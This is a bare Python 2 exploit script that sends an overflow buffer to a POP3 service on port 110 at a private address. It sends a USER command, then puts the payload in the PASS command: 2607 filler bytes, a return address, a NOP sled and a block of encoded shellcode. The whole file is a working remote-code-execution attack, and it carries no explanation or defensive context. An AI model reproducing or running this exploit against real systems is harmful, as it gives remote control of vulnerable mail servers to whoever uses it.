#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

shellcode = (
"\x6a\x48\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x0f\xde\xce"+
"\x1c\x83\xeb\xfc\xe2\xf4\xf3\xb4\x25\x51\xe7\x27\x31\xe3\xf0\xbe"+
"\x45\x70\x2b\xfa\x45\x59\x33\x55\xb2\x19\x77\xdf\x21\x97\x40\xc6"+
"\x45\x43\x2f\xdf\x25\x55\x84\xea\x45\x1d\xe1\xef\x0e\x85\xa3\x5a"+
"\x0e\x68\x08\x1f\x04\x11\x0e\x1c\x25\xe8\x34\x8a\xea\x34\x7a\x3b"+
"\x45\x43\x2b\xdf\x25\x7a\x84\xd2\x85\x97\x50\xc2\xcf\xf7\x0c\xf2"+
"\x45\x95\x63\xfa\xd2\x7d\xcc\xef\x15\x78\x84\x9d\xfe\x97\x4f\xd2"+
"\x45\x6c\x13\x73\x45\x5c\x07\x80\xa6\x92\x41\xd0\x22\x4c\xf0\x08"+
"\xa8\x4f\x69\xb6\xfd\x2e\x67\xa9\xbd\x2e\x50\x8a\x31\xcc\x67\x15"+
"\x23\xe0\x34\x8e\x31\xca\x50\x57\x2b\x7a\x8e\x33\xc6\x1e\x5a\xb4"+
"\xcc\xe3\xdf\xb6\x17\x15\xfa\x73\x99\xe3\xd9\x8d\x9d\x4f\x5c\x9d"+
"\x9d\x5f\x5c\x21\x1e\x74\xcf\x76\xc5\x86\x69\xb6\xe9\x13\x69\x8d"+
"\x47\xfd\x9a\xb6\x22\xe5\xa5\xbe\x99\xe3\xd9\xb4\xde\x4d\x5a\x21"+
"\x1e\x7a\x65\xba\xa8\x74\x6c\xb3\xa4\x4c\x56\xf7\x02\x95\xe8\xb4"+
"\x8a\x95\xed\xef\x0e\xef\xa5\x4b\x47\xe1\xf1\x9c\xe3\xe2\x4d\xf2"+
"\x43\x66\x37\x75\x65\xb7\x67\xac\x30\xaf\x19\x21\xbb\x34\xf0\x08"+
"\x95\x4b\x5d\x8f\x9f\x4d\x65\xdf\x9f\x4d\x5a\x8f\x31\xcc\x67\x73"+
"\x17\x19\xc1\x8d\x31\xca\x65\x21\x31\x2b\xf0\x0e\xa6\xfb\x76\x18"+
"\xb7\xe3\x7a\xda\x31\xca\xf0\xa9\x32\xe3\xdf\xb6\x3e\x96\x0b\x81"+
"\x9d\xe3\xd9\x21\x1e\x1c"
)

buffer = "A"*2607+"\x8f\x35\x4a\x5f"+"\x90"*8+shellcode

try:
	print "\nSending evil buffer..."
	s.connect(('192.168.11.155', 110))
	data = s.recv(1024)

	s.send('USER liuzh'+'\r\n')
	data = s.recv(1024)

	s.send('PASS'+ buffer +'\r\n')
	
	print "\nDone"

except:
	print "Could not connect to POP3"

	